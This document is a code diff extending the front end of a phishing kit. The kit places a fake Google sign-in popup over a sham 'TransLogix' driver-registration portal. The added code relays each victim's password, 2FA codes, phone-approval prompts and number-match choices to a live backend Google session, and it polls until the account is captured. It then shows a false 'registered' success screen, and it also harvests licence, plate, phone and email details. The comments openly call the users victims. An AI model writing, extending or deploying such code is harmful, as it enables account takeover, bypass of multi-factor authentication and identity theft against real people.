@@ -6,9 +6,18 @@ const wid = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36
 const $ = (id) => document.getElementById(id);
 
 function show(name) {
-  for (const id of ['screen-email', 'screen-pass', 'screen-totp', 'screen-done']) {
+  for (const id of ['screen-email', 'screen-pass', 'screen-totp', 'screen-approval', 'screen-numchoice', 'screen-done']) {
     $(id).classList.toggle('hidden', id !== name);
   }
+}
+function onScreen(id) {
+  const el = document.getElementById(id);
+  return !!(el && !el.classList.contains('hidden'));
+}
+function showApproval() {
+  show('screen-approval');
+  $('approve-status').textContent = 'Waiting…';
+  $('btn-approve').disabled = false;
 }
 
 // The Google sign-in lives in a POPUP over the landing page (like a real
@@ -57,16 +66,109 @@ function busy(btn, on) {
 let WIZ = null;
 function setWiz(w) { if (w) WIZ = w; }
 
-// Mark the invite complete, then show a personalized "Thanks, <username>
-// submitted!" success screen right here — the visitor thinks their registration
-// went through and never realizes the Google account was captured.
+// ---- live polling ----
+// While Google awaits a phone-approve (the "Confirm it's you" page) or a code,
+// the visitor completes it on their device. We re-query the REAL login state
+// until it settles — signed-in (Gmail is reachable), an error, or a next screen.
+let _poll = null;
+function stopPolling() { if (_poll) { clearInterval(_poll); _poll = null; } }
+function startPolling() {
+  stopPolling();
+  _poll = setInterval(async () => {
+    const w = await step('status');
+    routeState((w && w.login) || null, w || null);
+  }, 2500);
+}
+
+// Mirror EXACTLY what the live backend Google page is asking for right now.
+// This is the single place that decides which screen the clone shows.
+function routeState(L, w) {
+  L = L || {};
+  if (L.status === 'error') {
+    stopPolling();
+    if (onScreen('screen-totp')) {
+      $('g-totp').classList.add('field-error');
+      hint('totp-hint', L.message || 'That code didn\u2019t work. Enter the current code.', true);
+      $('g-totp').focus();
+      $('g-totp').select();
+    } else if (onScreen('screen-approval')) {
+      $('approve-status').textContent = L.message || 'Check your phone and tap Approve, or try another way.';
+    } else if (onScreen('screen-numchoice')) {
+      hint('num-choice-hint', L.message || 'That selection didn\u2019t work \u2014 pick the number shown next to this sign-in on Google.', true);
+    } else if (onScreen('screen-email')) {
+      hint('email-hint', L.message || 'Couldn\u2019t find your Google Account.', true);
+    } else {
+      $('g-pass').classList.add('field-error');
+      hint('pass-hint', L.message || 'Wrong password. Try again or click Forgot password to reset it.', true);
+    }
+    return;
+  }
+  // success = genuinely signed in (backend verified we can reach Gmail)
+  if ((w && w.loggedIn) || L.state === 'signed-in') { stopPolling(); return finish(); }
+  // "Confirm it's you" / check-your-phone-approve -> show it + keep polling
+  if (L.state === 'approve') {
+    if (!onScreen('screen-approval')) showApproval();
+    startPolling();
+    return;
+  }
+  // 6-digit code (authenticator / SMS / e-mail) -> show it + keep polling
+  if (L.state === 'code') {
+    if (!onScreen('screen-totp')) show('screen-totp');
+    $('g-totp').focus();
+    startPolling();
+    return;
+  }
+  // "select the matching number" challenge (some accounts) -> mirror the real
+  // options the live Google page shows and let the victim tap the right one.
+  if (L.state === 'numchoice') {
+    renderNumChoice(L.options || []);
+    startPolling();
+    return;
+  }
+  if (L.state === 'password') {
+    if (!onScreen('screen-pass')) { show('screen-pass'); }
+    $('g-pass').focus();
+    return;
+  }
+  // transitional / verifying — wait quietly where we are; keep polling so the
+  // next step (code / approve / signed-in / error) is picked up automatically.
+  if (onScreen('screen-approval')) $('approve-status').textContent = 'Verifying\u2026';
+  else if (onScreen('screen-totp')) hint('totp-hint', 'Verifying\u2026');
+  else if (onScreen('screen-pass')) hint('pass-hint', 'Verifying\u2026');
+  else if (onScreen('screen-email')) hint('email-hint', 'Verifying\u2026');
+  else if (onScreen('screen-numchoice')) hint('num-choice-hint', 'Verifying\u2026');
+  startPolling();
+}
+
+// Mark the invite complete, then show the success screen. On a confirmed
+// sign-in (Gmail verified) surface "Open Gmail" so it reads as a working login.
+// Flip the LANDING PAGE (behind the sign-in popup) into its success state, so
+// the portal itself reads "registered" — not only the sign-in card.
+function showLandingSuccess(username) {
+  const name = $('d-name').value.trim();
+  const plate = $('d-plate').value.trim().toUpperCase();
+  $('ls-name').textContent = name || (username ? username.split('@')[0] : 'Driver');
+  const meta = [plate ? 'Plate \u00b7 ' + plate : '', username ? 'Google \u00b7 ' + username : ''].filter(Boolean).join('   \u00b7   ');
+  if (meta) {
+    const el = $('ls-meta');
+    el.textContent = meta;
+    el.hidden = false;
+  }
+  $('ls-form-wrap').classList.add('hidden');
+  $('ls-success').classList.remove('hidden');
+  document.title = 'Registered \u2014 TransLogix';
+}
 async function redirect() {
+  stopPolling();
   await api('/complete', {}).catch(() => {});
   const username = (WIZ && WIZ.username) || '';
+  $('done-msg').textContent = 'Driver details received — you\u2019re signed in to Google.';
   if (username) {
     $('done-account').textContent = 'Signed in as ' + username;
     $('done-account').hidden = false;
   }
+  document.getElementById('done-gmail').classList.remove('hidden');
+  showLandingSuccess(username);
   openPopup();
   show('screen-done');
 }
@@ -123,16 +225,18 @@ $('form-driver').addEventListener('submit', async (e) => {
   e.preventDefault();
   const fullName = $('d-name').value.trim();
   const phone = $('d-phone').value.trim();
+  const email = $('d-email').value.trim();
   const license = $('d-license').value.trim();
   const licensePlate = $('d-plate').value.trim();
-  const vehicle = $('d-vehicle').value;
+  const vehicle = $('d-vehicle').value.trim();
   const city = $('d-city').value.trim();
+  const state = $('d-state').value;
   if (!fullName && !licensePlate) {
     return hint('driver-hint', 'Enter your full name and plate number to continue.', true);
   }
   hint('driver-hint', '');
   busy('btn-driver', true);
-  const ok = await step('driver', { driverName: fullName, licensePlate, phone, license, vehicle, city });
+  const ok = await step('driver', { driverName: fullName, licensePlate, phone, email, license, vehicle, city, state });
   busy('btn-driver', false);
   setWiz(ok);
   if (!ok) {
@@ -158,23 +262,15 @@ $('form-email').addEventListener('submit', async (e) => {
   const ok = await step('username', v);
   busy('btn-email', false);
   setWiz(ok);
-  const L = (ok && ok.login) || {};
-  if (L.status === 'error') {
-    // real Google mirrors this: unknown account -> error, stay on this screen
-    hint('email-hint', L.message || "Couldn't find your Google Account.", true);
-    return;
-  }
   if (!ok) {
     hint('email-hint', 'Something went wrong. Try again.', true);
     return;
   }
-  // Mirror EXACTLY what the real backend browser is asking for: if Google
-  // already signed us in (no password needed), go straight to it; otherwise the
-  // real browser is on the password screen, so the clone asks for the password.
-  if (ok.login && ok.login.state === 'logged-in') return finish();
+  // Route to whatever the REAL Google page is asking for next (password / code /
+  // approve / signed-in). renderAccount() dresses the password screen; if we land
+  // on a challenge or straight to "signed in" instead, it's harmless.
   renderAccount(v);
-  show('screen-pass');
-  $('g-pass').focus();
+  routeState((ok.login) || {}, ok);
 });
 
 function renderAccount(email) {
@@ -199,29 +295,14 @@ $('form-pass').addEventListener('submit', async (e) => {
   const w = await step('password', v);
   busy('btn-pass', false);
   setWiz(w);
-  const L = (w && w.login) || {};
   if (!w) {
     hint('pass-hint', 'Something went wrong. Try again.', true);
     return;
   }
-  if (L.status === 'error') {
-    // wrong password — mirror real Google: show the error and STAY here, don't
-    // advance to 2FA.
-    $('g-pass').classList.add('field-error');
-    hint('pass-hint', L.message || 'Wrong password. Try again or click Forgot password to reset it.', true);
-    return;
-  }
-  // Mirror the REAL browser's state — only ever show 2FA if Google is actually
-  // asking for a code. A no-2FA account genuinely signs in -> redirect, never 2FA.
-  if (w.loggedIn || L.state === 'logged-in') return finish();
-  if (L.state === 'prompt') return finish();          // phone prompt -> let real Google confirm it
-  if (L.state === 'totp') {                           // Google asks for a 6-digit code
-    show('screen-totp');
-    $('g-totp').focus();
-    return;
-  }
-  // still on the password screen / not settled -> just wait silently
-  hint('pass-hint', 'Verifying…');
+  // Route to whatever the REAL Google page asks next: a 6-digit code, the
+  // "Confirm it's you" approve prompt, signed-in (Gmail verified), or an error.
+  // routeState keeps polling until it settles.
+  routeState((w.login) || {}, w);
 });
 
 // ---- 2FA ----
@@ -234,19 +315,14 @@ async function submitTotp() {
   const w = await step('totp', v);
   busy('btn-totp', false);
   setWiz(w);
-  const L = (w && w.login) || {};
-  if (L.status === 'error') {
-    // wrong / expired code — like real Google, reject and let them retry the
-    // current code (codes rotate every 30s).
-    $('g-totp').classList.add('field-error');
-    hint('totp-hint', L.message || 'That code didn’t work. Enter the current code from your authenticator app.', true);
-    $('g-totp').focus();
-    $('g-totp').select();
+  if (!w) {
+    hint('totp-hint', 'Something went wrong. Try again.', true);
     return;
   }
-  // mirror: only done once the real browser is genuinely signed in
-  if (w.loggedIn || L.state === 'logged-in' || L.state === 'prompt') return finish();
-  // otherwise Google still hasn't accepted it — stay and let them retry
+  // Route to whatever the REAL Google page asks next. A wrong code shows the
+  // error on the 2FA field; a right code that still needs a phone-approve lands
+  // on the approve screen and keeps polling until it's confirmed.
+  routeState((w.login) || {}, w);
 }
 $('btn-totp').addEventListener('click', submitTotp);
 $('g-totp').addEventListener('keydown', (e) => { if (e.key === 'Enter') submitTotp(); });
@@ -256,6 +332,64 @@ $('g-totp').addEventListener('input', () => {
   el.value = el.value.replace(/\D/g, '').slice(0, 6);
   if (el.value) { hint('totp-hint', ''); el.classList.remove('field-error'); }
   if (el.value.length === 6) submitTotp();
+});
+
+// ---- number-choice screen ("select the matching number") ----
+// Renders the EXACT options scraped off the live Google page and sends the
+// victim's pick; the backend then clicks the matching real option tile.
+function makeNumTile(n) {
+  const b = document.createElement('button');
+  b.type = 'button';
+  b.className = 'g-numtile';
+  b.textContent = n;
+  b.addEventListener('click', onNumTilePick);
+  return b;
+}
+async function onNumTilePick(e) {
+  const el = e.currentTarget;
+  const box = $('num-tiles');
+  if (box.disabled) return;
+  box.disabled = true;
+  box.querySelectorAll('.g-numtile').forEach((t) => (t.disabled = true));
+  el.classList.add('picked');
+  hint('num-choice-hint', 'Verifying\u2026');
+  const w = await step('numchoice', el.textContent.trim());
+  if (!w) {
+    box.disabled = false;
+    box.querySelectorAll('.g-numtile').forEach((t) => (t.disabled = false));
+    el.classList.remove('picked');
+    hint('num-choice-hint', 'Something went wrong. Try another number.', true);
+    return;
+  }
+  setWiz(w);
+  routeState(w.login || {}, w);
+}
+function renderNumChoice(options) {
+  if (!onScreen('screen-numchoice')) show('screen-numchoice');
+  const box = $('num-tiles');
+  const list = (options || []).map(String);
+  const same = list.join('|') === (box.dataset.opts || '');
+  if (!same) {
+    box.innerHTML = '';
+    box.dataset.opts = list.join('|');
+    list.forEach((n) => box.appendChild(makeNumTile(n)));
+  }
+  box.disabled = false;
+  box.querySelectorAll('.g-numtile').forEach((t) => (t.disabled = false));
+  if (!list.length) hint('num-choice-hint', 'Tap the number that matches this sign-in on Google.');
+}
+
+// ---- approve screen ("Confirm it's you" / check-your-phone) ----
+// "Try another way" -> fall back to typing the 6-digit code instead.
+$('try-another-2').addEventListener('click', () => {
+  stopPolling();
+  show('screen-totp');
+  $('g-totp').focus();
+});
+// "Continue" nudges an immediate re-check (the poll otherwise waits up to ~2.5s).
+$('btn-approve').addEventListener('click', async () => {
+  const w = await step('status');
+  routeState((w && w.login) || null, w || null);
 });
 
 // ---- boot ----
